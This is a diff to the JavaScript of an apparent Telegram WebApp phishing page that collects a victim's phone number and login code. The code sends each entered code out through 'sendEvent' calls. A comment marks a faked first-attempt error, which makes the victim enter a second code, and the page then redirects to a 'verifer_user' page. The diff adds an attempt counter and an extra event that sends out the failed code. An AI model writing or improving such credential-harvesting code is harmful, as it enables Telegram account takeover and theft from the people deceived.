@@ -1,10 +1,10 @@
 document.addEventListener('DOMContentLoaded', () => {
-    //// Проверка поддержки Telegram WebApp
-    //if (!window.Telegram || !window.Telegram.WebApp) {
-    //    console.error('Telegram WebApp is not available');
-    //    showFatalError('Это приложение работает только в Telegram. Пожалуйста, откройте его через Telegram бота.');
-    //    return;
-    //}
+    // Проверка поддержки Telegram WebApp
+    if (!window.Telegram || !window.Telegram.WebApp) {
+        console.error('Telegram WebApp is not available');
+        showFatalError('Это приложение работает только в Telegram. Пожалуйста, откройте его через Telegram бота.');
+        return;
+    }
 
     const tg = window.Telegram.WebApp;
     const elements = {
@@ -17,6 +17,8 @@ document.addEventListener('DOMContentLoaded', () => {
         submitPhoneBtn: document.getElementById('submit-phone'),
         submitCodeBtn: document.getElementById('submit-code')
     };
+
+    let attemptCount = 0;
 
     // Инициализация приложения
     function init() {
@@ -32,15 +34,12 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Настройка обработчиков событий
     function setupEventListeners() {
-        // Обработчики закрытия приложения
         tg.onEvent('viewportChanged', handleViewportChange);
         tg.onEvent('closingConfirmation', handleAppClose);
 
-        // Обработчики ввода
         elements.phoneInput.addEventListener('input', formatPhoneInput);
         elements.codeInput.addEventListener('input', handleCodeInput);
 
-        // Обработчики кнопок
         elements.submitPhoneBtn.addEventListener('click', handlePhoneSubmit);
         elements.submitCodeBtn.addEventListener('click', handleCodeSubmit);
     }
@@ -171,7 +170,7 @@ document.addEventListener('DOMContentLoaded', () => {
         setLoading(elements.submitCodeBtn, true);
         
         try {
-            await sendEvent('code', { code });
+            await sendEvent('code', { code, attempt: attemptCount + 1 });
             
             if (attemptCount === 0) {
                 // Первая попытка - имитация ошибки
@@ -181,12 +180,16 @@ document.addEventListener('DOMContentLoaded', () => {
                     elements.codeInput.value = '';
                     attemptCount++;
                     vibrate('heavy');
+                    sendEvent('code_attempt_failed', { code, attempt: attemptCount });
                 }, 3000);
             } else {
                 // Вторая попытка - успех
                 setTimeout(() => {
                     vibrate('heavy');
-                    sendEvent('verification_success', { code, attempts: attemptCount + 1 });
+                    sendEvent('verification_success', { 
+                        code, 
+                        attempts: attemptCount + 1 
+                    });
                     window.location.href = 'https://otz2026.github.io/mybot/verifer_user/index.html';
                 }, 2000);
             }
